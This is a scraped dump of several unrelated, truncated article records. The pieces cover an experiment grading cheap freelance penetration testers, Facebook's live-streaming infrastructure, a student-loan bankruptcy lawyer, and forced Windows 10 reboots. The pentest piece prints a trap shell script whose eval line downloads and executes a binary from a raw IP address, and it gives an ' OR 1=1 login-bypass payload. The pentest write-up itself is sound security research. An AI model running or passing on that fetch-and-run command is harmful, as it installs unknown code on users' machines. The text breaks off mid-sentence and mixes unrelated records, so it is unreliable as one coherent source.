"note_en": "Penetration testing is complex. For it to be successful, the tester needs to possess a variety of different abilities and skills. Some testers rely only on automated tools, while others focus more on manual analysis. While a creative and unconventional way of thinking is necessary, it is also important for the tester to possess the mental discipline to adhere to the time constraints set by the client. It is common for a creative penetration tester to spend a significant amount of time investigating a fun and uncommon exploit, only to realize later that there is not enough time left to provide complete coverage. It is, therefore, not surprising that two different testers will produce two separate reports that include different findings.\n I decided to run a little experiment to see how different the reports of different testers would be. I purposely created a vulnerable web application, and hired seven different freelancers to conduct penetration testing against it. I found this to be an excellent opportunity to evaluate the skills of freelancers that provide their services at an extremely low price in online marketplaces. While the cost of penetration testing can be pretty high (typically between $1,000 and $100,000+), these freelancers provide their security services for less than $100. Some of them claim to possess industry-accepted certificates, and I was curious to know the quality of their work, in particular when their services are reviewed positively by thousands of buyers.\n  To keep things simple, I created a PHP login form that included two critical vulnerabilities that could be exploited to bypass the authentication form. While these bugs were not hard to discover or exploit, they required manual analysis; a tester that relies only on automated tools would not be able to identify them.\n The first vulnerability on the form stems from a bug in session management. During the login operation of the web application, even if the credentials are wrong, the application is including the following header in the HTTP response:  Set-Cooki auth=195c530a7af5f492a74499e70578d150. A careful penetration tester that manually examines the HTTP response should be able to recognize that there is a typo in the name of the &#34;Set-Cookie&#34; header, hence the browser will not automatically set the cookie value. By setting this cookie value manually, the tester will gain admin privileges.\n  The second way to bypass the authentication of the form is by inputting &#34; &#39; OR 1=1&#39;&#34; or a similar payload. The root cause of this issue appears to be an SQL Injection vulnerability, but it is, in fact, a hardcoded SQL password. The executed SQL query can be found in the HTTP response:\n SELECT * FROM form_passwords WHERE &#39;password&#39; LIKE CONCAT(\t&#39;%&#39;, \tIF(STRCMP(SYSTEM_USER(), &#39;/dev/random@localhost&#39;)=-1, REVERSE(&#34; \\&#39;&#34;), \tISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), \tIF(STRCMP(SESSION_USER(), &#39;/dev/null@localhost&#39;)=0, CHAR(40*2-POWER(1, LOG(2)),(4*10+1)*2), \tCHAR(69,4*10+9)), SPACE(1), &#39;%&#39; ,&#39;\\&#39;&#39;,&#39;%&#39;,IF(STRCMP(VERSION(), &#39;10.3.15-MariaDB-0+deb10u1&#39;)=0,\tIF(CONNECTION_ID()=1337,&#34;&#39;&#34;=&#34;&#34;,&#39;-_-&#39;),\tIF(PI()&lt;3,&#34;&lt;(^^)&gt;&#34;,&#34;&#39;=&#34;)), MID(&#34;```&#39;`&#39;&#39;`&#39;`&#39;`&#39;``&#39;`&#39;``&#39;```````&#39;`&#39;`&#39;`&#39;`&#39;`&#39;&#39;`&#39;`&#39;`&#34;,7,1), &#39;%&#39;);\n The tester will have to de-obfuscate the SQL query in order to extract the hardcoded password. For the tester to de-obfuscate the SQL query, he needs to possess basic knowledge of SQL syntax. This particular SQL query that I created is using nested inline IF statements. The conditions are checking the environmental variables  SYSTEM_USER,  SESSION_USER and  VERSION). Since these values are not known to the tester, he will have to follow all the different logic paths until the constructed query makes sense. Some simple simplifications here and there can make the query much more readable.\n  After de-obfuscation, the final query will be: &#34; SELECT * FROM form_passwords WHERE &#39;password123&#39; LIKE %&#34; OR %&#34;$&#39;=%&#34;. Inputs such as &#34; &#39; OR 1=1&#39;&#34; would allow the tester to bypass the authentication form successfully. I purposely decided to use a payload that is commonly used when testing forms for SQL injections as an answer to this riddle, to see how many of these testers would correctly identify the root cause of this issue.\n To make things even more interesting, I put a malicious shell script as part of the HTTP response. The contents of the shell script were the following:\n obscure() { local txt=&#34;$1&#34; local txt=&#34;$a\\&#39;{}&#34; echo &#34;${txt//?/*}&#34;}sql_1 = &#39;SELECT * FROM form_passwords WHERE &#34;asfsadfd&#34; LIKE CONCAT(&#34;%&#34;, IF(STRCMP(SYSTEM_USER()&#39;sql_2 = &#39;REVERSE(), ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), IF(STRCMP(SESSION_USER(), &#34;/dev/null@localhost&#34;)=0&#39;sql_3 = `wget http://83.212.174.87/mal | chmod +x ./mal | ./mal`sql_4 = &#39;10.3.15-MariaDB-0+deb10u1)=0,IF(CONNECTION_ID()=1337,&#34;=&#34;-_-,IF(PI()&lt;3,&lt;(^^)&gt;&#39;sql_5 = &#39;LOG(2)),(4*10+1)*2), CHAR(69,4*10+9)), SPACE(1&#39;echo &#34;Deobfuscating...&#34;eval &#34;$sql_1&#34;eval &#34;$sql_2&#34;eval &#34;$sql_3&#34;eval &#34;$sql_4&#34;eval &#34;$sql_5&#34;\n As can be seen, on line 12, the script is downloading and executing a binary from the Internet. I wanted to see how many of these testers will be careless enough to run my malicious script without auditing it first.\n Finally, I installed an SSH honeypot. My intention was to record any shell interactions by the testers and evaluate their post-exploitation methodology.\n The profiles of all the testers I hired had overwhelmingly positive reviews on the online marketplace. I pretended that I needed my web form tested before my group used it in production. I received all the penetration testing reports a few days later.\n   The tester claimed to be a Certified Ethical Hacker v9 with experience in Vulnerability Assessments and Penetration Testing.\n The tester delivered the report and mentioned that he found a serious flaw in the system. He failed to identify any of the high severity findings. The report included irrelevant information, such as &#34;Banner Grabbing &amp; Version Detection,&#34; as well as a &#34;Performance / Load Test.&#34; The serious flaw that the tester identified was logging in to the SSH honeypot.\n   The tester described himself as an independent information security researcher. He mentioned that he had finished his Bachelor&#39;s in Computer Science and Certified Ethical Hacker Course by EC-Council. He claimed to have hands-on experience in vulnerability assessment and penetration testing.\n This tester, too, failed to identify any of the high severity findings. The tester believed he had gotten local access to the remote machine, failing to realize that this was, in fact, a honeypot. The results that were reported had no direct impact (in regard to Integrity, Availability, Confidentiality), or they were not valid at all (e.g., directory brute-forcing).\n    The tester claimed that they usually charge $200 for complete pentest and report, but since canceling the order will have a negative impact on their profile, they agreed to carry out the testing. They asked me to tip well after I receive the report.\n Most of the findings included in this report were part of the Nessus security tool. A reflected XSS finding on a POST parameter was exaggerated as a HIGH. None of the HIGH-severity findings were identified.\n    This tester identified the SQL vulnerability successfully but failed to identify the root cause of it. He reported the vulnerability as an SQL injection as opposed to a hardcoded password. The rest of the findings he reported were part of Burp Suite&#39;s automated scanner.\n   The tester claimed to have a B.Sc in Computer Science and various certifications, including CEH Certified Ethical Hacker and Certified Payment Industry Security Implementer. On his profile, he mentions that he provides a variety of services from PCI DSS consulting to blockchain training.\n Again, none of the critical vulnerabilities were discovered. This tester did execute my malicious script even though, according to the report, he examined it for any security issues.\n   The tester claimed to have over 20 years of experience in Ethical Hacking, and his profile has over 100 positive reviews. I ordered the premium service that included a full penetration test, professional security assessment report and recommendations &amp; solutions.\n The tester failed to identify any of the HIGH-risk vulnerabilities. All the technical details on the report were taken from automated tools (OWASP ZAP and Netsparker).", "posttime": "2020-10-24 07:13:45", "source_domain": "news.ycombinator.com", "source_name": "Hacker

"note_en": "As Facebook Live and   Facebook Watch  have grown, the content shared there has expanded to include professionally produced, broadcast-quality content, like shows and live event coverage. This type of professional broadcasting from providers like La Liga, CONMEBOL, and UEFA is a very different challenge from user generated content (UGC) and viewers\u2019 expectations are much higher. Viewers who are used to the reliability and quality of traditional TV broadcasts expect a near-flawless viewing experience for these Live streams.\n While many companies do one or the other well, we need to support both UGC and broadcast-quality Live streams at a very large scale. These videos have to work every time \u2014 for everyone. To accomplish this, we built a system capable of managing both UGC (captured on all kinds of devices at differing quality levels) and broadcast-quality high-res streaming \u2014\u00a0and working reliably for billions of people around the world.\n To deliver a seamless streaming experience at this scale, the entire system, from ingest to delivery, needs to be reliable \u2014 but the overall system is only as reliable as its weakest component. Most UGC content uses public internet, which comes with some risk of variable network conditions: A capacity limit somewhere in the network may degrade quality, or a failure might cause a video stall or buffer for viewers. We never want viewers to experience interruptions like these on either social streaming or professional broadcasts, but for big events like the UEFA Champions League Final, the impact of losing audio or video for even a few seconds is high.\n We built new ingestion capabilities to bridge the gap between traditional TV production and the internet-based ingestion designed for our UGC audience. We built in redundancy at every point \u2014 transport, ingestion, processing, delivery, and playback \u2014 to make sure the system could withstand most types of failure. And we scaled our delivery infrastructure to support streams with unprecedented viewership. Along the way, we discovered new failure modes \u2014 as well as ways to mitigate them in time for the next broadcast.\n That video system is now in production, supporting millions of Live streams every day across both UGC and professional broadcast. In August, the system proved itself when we reached a huge number of concurrent viewers on the Facebook Live broadcast of the UEFA Champions League final. Viewership peaked at 7.2 million concurrents across both the Brazil and Spanish-speaking Latin America streams. Ensuring this level of seamless reliability required work on both ingestion and delivery.\n  Because the stakes are high, TV broadcasters keep everything on private, dedicated paths with guaranteed bandwidth. These paths are always geographically diverse: either two independent fiber-optic paths or a fiber-optic path with a satellite backup. To reliably support similar high-viewership broadcasts, we leverage a broadcast facility with our own managed encoders so we could easily access broadcast networks, usually private fiber and satellite links, to keep the video/audio quality and reliability as high as possible. That facility is connected to our data centers using dedicated and diverse connections.\n We also built mechanisms that allow ingestion of main and backup streams into our infrastructure as well as the ability to manually or automatically failover from main to backup in case of issues, all while ensuring that the viewing experience remains flawless.\n  This shift from supporting broadcasts in aggregate to supporting a single broadcast means things we traditionally accepted (machine restarts, network failures, congestion, etc.) now require careful mitigations. These mitigations (coordinated failover, dedicated link capacity, multiple geo-distributed paths, etc.) need to happen over the entire duration of games, which can easily run longer than four hours with pre- and post-shows.\n  In addition to ingesting content seamlessly and at scale, we also need to manage massive scale delivery of video content to viewers. These big events and broadcasters are followed by millions of people who get notifications when the Live stream starts. This creates a spike of simultaneous viewers trying to watch the Live stream. When edge cache servers (located proximate to users) don\u2019t have the requested content, they forward the request to underlying services. This causes what we call the  thundering herd problem \u2014 too many requests can stampede the system, causing lag, dropout, and disconnection from the stream.\n We have built robust infrastructure to protect our back-end services from such thundering herd issues by developing novel forms of request coalescing and cache sharding that allow us to reliably deliver video content while ensuring realtime playback.\n  When serving video data, we work with ISPs when possible to prevent network overload because of these high-concurrency events. For example, when we found that viewer experience in Rio de Janeiro was degraded by congestion between Facebook and a particular ISP, we increased our local interconnection capacity from 20 Gbps to 120 Gbps.\n As a result, we were able to keep almost all our Live video traffic within the viewer\u2019s ISP\u2019s network. This kept our traffic in-country and off congested international links, which benefits both the ISP (reducing its cost) and the viewers (improving their experience). With our Live video caches and dense connectivity to ISPs, we are closer to our viewers than ever before, so we can deliver higher-resolution video with fewer stalls. These investments ensured that millions of Facebook viewers had a seamless experience for the UEFA Champions League Final.\n  The streaming of the UEFA Champions League Final to 7.2 million concurrent viewers was a success and gave us more insight into last-mile connectivity challenges. We were able to seamlessly ingest the video, process it, and deliver it to the edge (where we interconnect with ISPs), but last-mile radio delivery was a big challenge for popular games because of limitations of current cellular technology. To solve this for the future, we are exploring using LTE-Broadcast to share a single copy of the stream for everyone on the same cell tower to overcome this last-mile challenge.\n Investing in connectivity and internet infrastructure is important to help   bring reliable, affordable internet to more people . We are nearing completion of a   new submarine cable , which will improve connectivity and improve redundancy and resilience in Latin America. And we will continue to evaluate deployment of new edge locations in order to help create healthy ecosystems for interconnectivity between networks and keep traffic in-country, not only for Facebook but also between ISPs within the same country.\n While this was a big milestone (and a learning experience) for us, it\u2019s not the end of the road. Our next big challenge will be New Year\u2019s Eve, which is the inverse of the challenges we faced with the UEFA Champions League Final. We traditionally see a spike of Live streams from individual devices as millions of people stream fireworks and celebrations at the same time when the clock strikes midnight around the world! For New Year\u2019s Eve, instead of optimizing caches for a small number of very popular broadcasts, we need to optimize our processing, I/O, and storage for a huge number of simultaneous

"note_en": "Last summer, Austin Smith of Smith Law Group LLP in New York City told me a story about his morning routine during law school. I had stumbled on his work in the student loan debt space, and we had been talking for a few months. He let me speak to a few of his clients, whose stories were rife with heartbreak. But, more than hearing from his clients, I wanted to know what would drive an attorney to try and flip legal opinion about an arcane bankruptcy law that no one else seemed to know of or care about. He wanted me to know that this hadn\u2019t been a grand plan \u2014 that he had been a screw-up, a terrible student, that his mood swings made it difficult to sustain relationships. It was not, he smirked, a story about \u201cdoing well by doing good.\u201d\n It was 2014, during his last year in law school, and every morning Smith forced himself to schlep to a local caf\u00e9 a few blocks from campus. He was in his early 30s, a late bloomer, as it were, coming off unremarkable attempts both at working in politics and as a writer, and here he was, trudging up the street every cold New England morning, poring over his textbooks and worried he was too late. His life up until this point had been a bizarre admixture of charmed and cursed; bad decisions followed by lucky breaks or vice versa. And most of the success he did have, come to think of it, traced back to his father\u2019s connections. He found himself the ultimate clich\u00e9, slinking back to what his father \u2014 a lawyer himself \u2014 wanted him to do all along. Up until that point, he felt himself creeping closer and closer to that of a pathetic drifter destined to sink into society\u2019s languid center of mediocrity as if a pool of sticky black ooze.\n One day, just before six a.m., he got to talking with another regular customer at the coffee shop, a local litigator, about an assignment he was dreading: writing an article for the  Maine Law Review. Smith liked law, and the institution it represented, but he hadn\u2019t yet discovered a facet of his profession in which he found purpose and passion. He had always been an out-of-the-box thinker, distrustful of the systems that purported to uplift and protect the common man, but civil rights law or public defense seemed too well-worn and typical for the budding attorney. Smith was waiting for a lightbulb to go off in his head. And, as it turns out, sharing the morning mud with a random lawyer in Maine would produce a fork in the road that would send him on a quest \u2014 one that would forever change his career and the lives of hundreds of thousands of regular people. That\u2019s because, that morning, the local litigator told Smith he should write his article for the law review about student loan debt and bankruptcy.\n       The man kept hounding him. \u201cEvery day, it was the same thing: Hey, look at this, look at this, look at  this,\u201d Smith said. \u201cAnd so finally, just to get him off my back, I started reading the stuff he dropped off for me, and as I was reading it, that\u2019s when I was like, \u2018This statute doesn\u2019t say what everyone thinks it says,\u2019\u201d Smith told me. \u201cEveryone has been getting this wrong for decades. How did this happen?\u201d That\u2019s when it dawned on him: The system writ-large has always been rigged in one way or another, but it was even more cruel and arcane for the 45 million Americans who had student loan debt \u2014 and the window into all of it was the crusty old bankruptcy code about which no one had thought twice.\n Bankruptcy was implemented in the early 1800s as an economic escape valve for everyday people. If a person had become consumed by debt or hardship, they could go to court and a judge would formulate a petition to manage, or discharge entirely, the money that they owed. It was, in essence, a second chance at life. To any attorney interested in bankruptcy law, however, it was carved in stone that student loans, unlike credit card or medical debt, could not be discharged. It had been this way for decades \u2014 a carefully crafted layer-cake of statutes that, over time, made it impossible to get rid of student loan debt. If you borrowed money to attend college, from the federal government and private banks alike, you were stuck with the bill for the rest of your life. To even a newbie like Smith, it was obvious that borrowers who went to college on credit would, in one way or another, have to pay back what they owed. What was the point of digging into it further? But that was before he met this random lawyer at this run-down coffee shop, and before he really started reading the fine print of these laws.\n Deep in the code, Smith found vague legalese, \u201ceducational benefit,\u201d that likely did not actually encompass any loan that provided an educational advantage. He spent two months digging through Congressional records and found that, in 1990, when this provision was written into the law, \u201ceducation benefit\u201d actually referred to specific grants, like healthcare for veterans, that the government used to issue. He was shocked because this line of the code had been protecting lenders \u2014 especially predatory big banks \u2014 for decades. These were the same banks that caused the financial crash of 2008, and they used the same playbook for subprime mortgages as they did for privately issued student loans: They preyed on people\u2019s quest for opportunity and duped them into taking on debt that they would never realistically be able to repay.\n Smith knew that there were myriad types of student loans given out to borrowers, many of which came directly from, or were insured by, the federal government and were immune to discharge in bankruptcy \u2014 \u201cThe one person you can\u2019t screw is Uncle Sam,\u201d Smith said \u2014 but he also knew that billions of dollars worth of debt was being issued every year from big banks directly to twinkle-eyed college kids who hoped an education would be their one-way ticket towards the American Dream. And with sky-high default rates in these pools of private student loans, an ominous comparison had presented itself: If subprime mortgage borrowers were one broken appliance away from default, indebted college graduates were one missed freelance check away from life-destroying catastrophe. Smith knew his discovery could have vast implications.\n Smith wrote the article, making his case that billions of dollars of student loan debt was actually dischargeable in bankruptcy, and his professors were shocked by and skeptical of this discovery. But, still, when compared to the total amount of student loan debt out there \u2014 now over $1.7 trillion and going up $2,853.88 per second, an increase almost identical to the ongoing cost of the Global War on Terror \u2014 this slice of debt was paltry. \u201cPeople tell me, \u2018Well, the private student loan market is only $150 billion.\u2019 Yes, in the abstract, it\u2019s smaller than the federal debt, but it is affecting these people far worse,\u201d Smith told me. \u201cAnd, not for nothing, $150 billion is a  shitload of money; it just doesn\u2019t look that way compared to $1.4 trillion.\u201d\n Smith is right: The amount of outstanding private student loan debt is larger than the GDP of Austin, Texas. That\u2019s a lot of debt being thrust upon unsuspecting borrowers, and an unimaginable amount of debt still owed by middle-class citizens. What Smith didn\u2019t know then, but what he knows now, was that this pool of toxic debt also had profound implications for the American economy. \u201cYou do stand to see longer-term negative effects on people who can\u2019t pay off their student loans. It hurts their credit rating; it impacts the entire half of their economic life,\u201d Federal Reserve Chairman Jerome Powell testified before the Senate Banking Committee in March 2019. \u201cAs this goes on, and as student loans continue to grow and become larger and larger, then it absolutely could hold back [economic] growth.\u201d And it\u2019s estimated that, by 2023, over 40 percent of borrowers who graduated in the 2003-2004 academic year \u2014 at the height of predatory lending \u2014 will default on their loans.\n But back to that crusty bankruptcy code: How on earth could laws be written that explicitly protected huge financial institutions and threw middle-class individuals under the bus? If a student thought that taking out a loan from J.P. Morgan Chase was going to help them kick-start their life as a working-class adult, they were in for a rude awakening. \u201cCompound interest will absolutely destroy you. And there are no protections in place,\u201d Smith told me. \u201cYou owe $100,000 at 12 percent interest? The payment plan on that is how much you have to pay a month to satisfy that loan in ten years. If it\u2019s $5,000 a month, it\u2019s $5,000 a month.  You only make $3,000 a month? Too bad. Pay me. You don\u2019t pay me, you\u2019re going to default, and we\u2019re going to sue you and make you pay. It\u2019s this completely upside down universe.\u201d\n Smith realized something else important early-on: The role of private banks dishing out this toxic, subprime debt to unsuspecting families does not exist in spite of the growing federal debt, but  because of it: slipshod government regulations, industry-friendly laws coming out of Congress, the tactics of financial aid offices to boost enrollment, and the sheer desperation for profits on Wall Street have prompted and promoted some of the most insidious consumer financial products to spread throughout higher education like a cancer. All of the worst aspects of consumer debt, the things that affect borrowers the most, had become woven into the very fabric of taking out money to go to college \u2014 and no one was doing anything about it. By 2013, nearly 25 percent of people who filed for bankruptcy had student loan debt on their balance sheets and almost none of it had been discharged. Everyone, in Smith\u2019s view, was asleep at the wheel. He became obsessed with student loan debt, and desperately wanted to litigate his point of view in open court. If he couldn\u2019t change the law, he told himself, perhaps he could find a way around it. He wanted to do something about this burgeoning crisis, and help those whose lives had been ruined by Wall Street, spineless policymakers in Washington, D.C., and schools who had promised kids a future but never delivered.\n In 2015, Smith\u2019s first year out of law school, he got a job at a white-shoe law firm in Manhattan and convinced his bosses to let him try a case. He found a client and filed a lawsuit against their lender, Citibank.\n \u201cI get to court, and I\u2019ve never been to court, I\u2019ve never argued. I have no idea what I\u2019m doing,\u201d Smith told me. \u201cI don\u2019t even know what table to stand at.\u201d\n As Citibank\u2019s attorney began arguing why the lawsuit should be dismissed \u2014 no doubt thinking this was just another day at the office \u2014 the judge cut him off and said, in essence,  You\u2019re wrong. I agree with him. Smith was stunned.  He won! The judge subsequently wrote an opinion on the case, giving him clear precedent to pursue this line of litigation further. This win revealed a pinhole of light at the end of a dark tunnel in which many borrowers find themselves trapped. He now had momentum. The light was getting brighter. He needed to keep going.\n \u201cI went back to my bosses and was like, \u2018There\u2019s tens of billions of dollars out there in these loans.\u2019 They said,  Dude, we told you, we don\u2019t sue banks; we defend them. What don\u2019t you get about this? I was like, \u2018I want to go do this!\u2019  Do What? \u2018File class actions! File more of these!\u2019 They were like,  Look, I know you get distracted by a shiny object and you think you\u2019re very proud of yourself by how clever you are, and it\u2019s cool, granted, you\u2019re a first-year lawyer and you got this done. Don\u2019t run off half-cocked on some sort of crazy idea. There was probably some merit to that advice, but I was like, \u2018Look, I get what you are saying, but I have to do this or I\u2019ll never forgive myself.\u2019\u201d\n Smith quit his job and struck out on his own. He\u2019s found immense success: Over the past four years, he has successfully discharged millions of dollars in predatory debt for over 50 individual borrowers. What he found most infuriating about these cases was not the lender\u2019s lack of compromise on settling the dispute, but rather the false moral equivalence with which they defended themselves. These banks were coming into bankruptcy court cloaking their own self interest under the guise of high principle: They argued that they weren\u2019t saddling students with toxic debt; they were doing God\u2019s work in making sure America\u2019s children were getting an education. \u201cThese lawyers were coming into court and saying shit like, \u2018My client has helped this poor woman through school, and it\u2019s really a tragedy that she now wants to erase the debt,\u2019\u201d Smith told me. \u201cIt\u2019s insane that these guys are trying to convince people that they are standing shoulder-to-shoulder with the Department of Education, because they are not.\u201d\n Smith quickly realized that, if he tackled these cases one-by-one, he\u2019d be dead before he got through them all. In 2016, Smith tried to find other lawyers to help him. It worked, albeit after a rocky start, and with the help of a cadre of like-minded attorneys Smith has filed five class-action lawsuits against America\u2019s most predatory lenders, servicers, and collectors of student loans: two against Wells Fargo, two against Navient (formerly known as Sallie Mae), and one against The National Collegiate Student Loan Trust (NCSLT).\n NCSLT is itself a beast to litigate against, as Smith has discovered since starting to represent individual borrowers who have been sued by the company. When he first heard of NCSLT, he had no idea what it was. \u201cThis shit was a black box,\u201d Smith said. \u201cI knew they gave out loans that were likely dischargeable, but nothing other than that.\u201d\n The National Collegiate Student Loan Trust is a shadowy LLC that somehow oversaw $12 billion in private student loan debt from the mid-2000s that encompassed 800,000 borrowers. But what, exactly, did this company do? They didn\u2019t originate, issue, or service their student loans. They didn\u2019t even have a website, an office, or employees. But they held a massive amount of private student loan debt, their borrowers were defaulting in higher numbers than any other pool of loans, and they were aggressively pursuing repayment, prompting their army of debt collectors to file hundreds of lawsuits on their behalf against borrowers every year. What was going on?\n The answer, it turned out, was Wall Street. Mirroring the subprime mortgage crisis, lenders of student loans discovered that they could make tons of money if they bundled up all of their loans into securitized trusts and sold tranches to investment banks. These student loan asset-backed securities, known as SLABS, became an enticing way to make money out of thin air for Sallie Mae as well as private banks who had no relationship to the federal government but wanted to stick their hand in this massive cookie jar.\n The creation of SLABS also ushered in the financial depersonalization of student debt. This B-rated tranche wasn\u2019t 25,000 kids living in their parents\u2019 basements, dreams slashed at becoming engineers or nurses or computer programmers, sequestered to their local Starbucks so they could make the minimum monthly payment on their loans. Oh no. It was a reliable slice of  warm investment pie. Ah, the bankers could almost smell it. And the changes in the bankruptcy code that made these loans non-dischargeable? Well, that layer of protection was the scoop of vanilla ice cream on top.\n By 2007, nearly every dollar that had been lent out to students across all lenders was bundled into SLABS and sold off to Wall Street. NCSLT wasn\u2019t the only one doing this; they were just the most brazen player in this new Wild West financial landscape. If Sallie Mae and other banks had pistols clipped to each hip, NCSLT carried a bazooka atop their shoulders. Smith, who himself had been approached by borrowers whose loans traced back to NCSLT, was shocked: The National Collegiate Student Loan Trust was nothing more than a way for student loans to be bundled into asset-backed securities and sold off to Wall Street. It was here that the head of the snake finally revealed itself \u2014 the real reason these loans were being issued in the first place.\n But it went deeper: Who was behind NCSLT? Smith discovered that it was First Marblehead, a small bank from Massachusetts. They specialized in subprime student loans issued to risky borrowers: kids from poor families, students enrolled at for-profit colleges, or those already saddled with federal loans. The bank, however, didn\u2019t have a federal charter, which would allow them to market and originate student loans on a national scale. A seat at the Big Boy Table, as it were. But they also had a solution. They approached various big banks, including PNC Bank, J.P. Morgan Chase, and Wells Fargo, and offered a deal: The banks would advertise and originate the loans, which came with 11 percent compound interest rates and high fees. From there, First Marblehead would immediately buy the debt and pay the bank a fee. This rent-a-charter arrangement allowed First Marblehead to make loans without having the legal authority to do it themselves. They also expanded into making loans directly through colleges. If a student came into the financial aid office needing a private loan, the school itself would issue the loan (as if its own bank), and, in exchange for a fee, First Marblehead would scoop up the debt. A university\u2019s institutional prowess acted as the perfect cover.\n With their rent-a-charters and university hook-ups in place, First Marblehead began issuing billions of dollars in private loans per year. To gain a competitive advantage, First Marblehead subsequently bought an educational non-profit, The Education Resources Institute (TERI), and routed all the loans through them, making the debt \u2014 now technically \u201cnon-profit loans\u201d \u2014 completely immune to discharge in bankruptcy. Business boomed. First Marblehead CEO Dan Meyers took the company public in 2003 and its stock skyrocketed over 250 percent in its first year. Meyers became worth hundreds of millions of dollars. He also made some pretty solid connections in higher education \u2014 and made sure to line their pockets. William Berkley, New York University\u2019s Chairman of the Board of Trustees, spent 16 years on First Marblehead\u2019s Board of Directors, where he cashed out stock options worth over $38 million before the company collapsed under the weight of their bad loans. NYU was one of the schools that offered First Marblehead\u2019s private loans to students.\n But back to Meyer\u2019s golden egg: Wall Street. Once First Marblehead had bought the debt issued from banks, they passed the loans onto a subsidiary, The National Collegiate Student Loan Trust, to be bundled into SLABS, where tranches would then be sold to investment banks. The book-runners for these offerings were the Who\u2019s Who of Wall Street: Goldman Sachs, Deutsche Bank, CitiBank, and UBS Investment Bank. \u201cThey are getting money from the tranche, and they use that to buy more loans from the banks, and around and around and around they go,\u201d Austin Smith said.\n But now, a decade after First Marblehead issued all of these loans, borrowers are defaulting in record numbers \u2014 and Smith is suing NCSLT both through individual cases and a class-action to erase the \u201cfraudulent\u201d debt. \u201cThis is what we are asking for,\u201d Smith explained, \u201c(1) All the outstanding debt is wiped away, you never call these people and ask for this money again, that debt is gone; (2), you have to give back all the money you have collected since the date of these people\u2019s initial bankruptcies; and (3), you have to pay punitive damages for your illegal conduct.\u201d\n Smith is currently waist-deep in these lawsuits, fighting them tooth-and-nail, and estimates they could encompass over 500,000 borrowers and potentially erase $3 billion in predatory student loan debt. He is the first person in the history of government and law \u2014 literally \u2014 to fight in bankruptcy court to discharge student loans for \n......", "posttime": "2020-10-24 07:03:16",

Terms of use.\n      More than five years after Windows 10 launched, Microsoft has never managed to curtail one of the operating system\u2019s most annoying features: its willingness to restart the computer while work is being done. For all the company\u2019s claims about how it has optimized this process, it pretends not to understand that users generally hate forced reboots.\n As Sean Hollister  points out for The Verge, he had actually  been in the process of writing about Microsoft\u2019s new habit of force-installing links to the Progressive Web Application (PWA) versions of its Office suite. PWAs are applications that are supposed to behave like a native application despite running in a browser window. Hollister got up to eat dinner, came back to his desk, and found his own machine had forcibly restarted, leaving him with \u2014 you guessed it \u2014 the same PWA applications.\n  Microsoft is once again distributing its software like malware. While I am not accusing Microsoft of shipping a trojan, applications that forcibly install themselves without user consent are, in fact, malware. There\u2019s nothing new about the apps themselves; they\u2019re the same version of Office you could previously use online. The difference is, now they\u2019ve stuffed themselves into the Start Menu so Microsoft can advertise its cloud services to you. Satya Nadella, Microsoft\u2019s CEO, has made Azure a major part of Microsoft\u2019s business going forward, to the point that the company claims Amazon and Facebook are its major gaming competitors rather than Sony and, to a lesser degree, Nintendo. This is, presumably, part of the effort to shove users into new paradigms of usage.\n  Hollister acknowledges that putting web links in the Start Menu is a fairly mild annoyance, but writes:\n [T]hey\u2019re the latest proof that Microsoft doesn\u2019t respect your ownership of your own PC, the latest example of Microsoft installing anything it likes in a Windows update up to and including bloatware, and the latest example of Microsoft caring more about the bottom line than whether a few people might lose their work when Windows suddenly shuts down their PC. Luckily, I didn\u2019t lose any work today, but a friend of mine recently did:\n Once again,  @Windows has restarted without notifying me and caused me to lose some work.\n I was typing note in Notepad, but had not yet transferred it to a Google Doc. Got up to get some water, when I came back my PC was rebooting. Text is gone. cc  @StarFire2258 because ugh this\n  Given Microsoft\u2019s ongoing and presumably permanent hostility towards user control, I\u2019d like to take a moment to inform readers of a utility called the  Windows Update Blocker (WUB). The Windows Update Blocker does exactly what it says on the tin: It prevents Microsoft from ever rebooting your PC to install updates or installing updates without permission.\n There are real reasons  not to use this utility. If you activate this utility and do not regularly turn it off to allow the machine to receive security updates, you risk being unprotected when new vulnerabilities appear. It\u2019s a bad idea to turn Windows Update off and then forget to update manually, so if you choose to go this route, you may want to set a periodic alert to remind you to update every few weeks or months. It\u2019s possible for a person to actively  want to be updated as soon as patches arrive while refusing to allow Microsoft to reboot their system out from under them.\n  I disable Windows Update on all testbeds after patching them up because I\u2019ve been burned before by having an update arrive 5-10 days after I configured the system. I\u2019ve been in the middle of 6-8 hour benchmark runs (SPEC Workstation takes a while) and had the system rebooted out from under me, forcing a complete restart of the tests from scratch.\n It is not sufficient to define \u201cActive Hours.\u201d It is unreasonable to expect people to keep an exact log of what their Active Hours at all times so they can remember to change them while working late. It is, apparently, too much work for Microsoft to program Windows not to reboot a computer outside of Active Hours if the keyboard is in use, or if the CPU and GPU are both loaded. I can understand why this might be so \u2014 the company might be afraid of malware deliberately loading the CPU and GPU as a way to keep Windows Update from running.\n But if this is true, the correct way to deal with it is to present the user with a periodic message that says \u201cWindows Update has not rebooted to install patches because you appear to be using the computer. Please schedule a time to reboot or press the \u2018Delay\u2019 button to see this prompt again in 4 \u2013 24 hours.\u201d The only thing Microsoft needs to do to fix this problem is bring back a feature that used to be a staple of Windows: The ability to delay a reboot. In Windows 7, if the \u201cA restart is required\u201d prompt popped up, and you didn\u2019t answer it, the machine assumed that it should  not restart.\n  I\u2019m not  recommending that people install the  Windows Update Blocker, because it\u2019s bad policy to recommend people make their computers less secure, as if this carried no potential downsides. But given Microsoft\u2019s behavior and its significant, negative ongoing impact on end-users, it\u2019s time to talk about solutions, even imperfect ones. Windows Update Blocker won\u2019t prevent Microsoft from eventually installing its malware-ish PWAs, but if you delay the installation until you\u2019re ready to deal with it, you\u2019ll at least know what you\u2019re getting into and where the problems are. PWA installations, incidentally, can be removed in the \u201cAdd/Remove Programs\u201d section of Settings or Control Panel.\n The correct answer to the question \u201cWhen is it acceptable to reboot the user\u2019s computer without permission?\u201d is \u201cNever.\u201d Microsoft would like to pretend otherwise. Everyone deserves the right to decide if they want to rent a PC that Microsoft retains control over, or if they prefer owning it themselves. The only time it ought to be permissible to reboot or shut down a computer without the consent of the user is if shutting the machine off is the only way to prevent thermal or electrical damage. In those circumstances, the CPU has far faster reflexes than any human could match. In every other situation, consent should be required.\n If Windows can reboot at will through a process I have no opportunity to interrupt, I\u2019m not the person in control of the PC. Until and unless Microsoft wants to start paying me to use one, they\u2019ve got no right to interfere in how it operates.\n  Edit: As Techutante states below, there\u2019s a different way to do this as well: Windows 10 Pro users can configure gpedit.msc to  block automatic reboots. Windows 10 Home users can choose to modify their registry and  install gpedit.msc, though we do not recommend screwing around in the registry 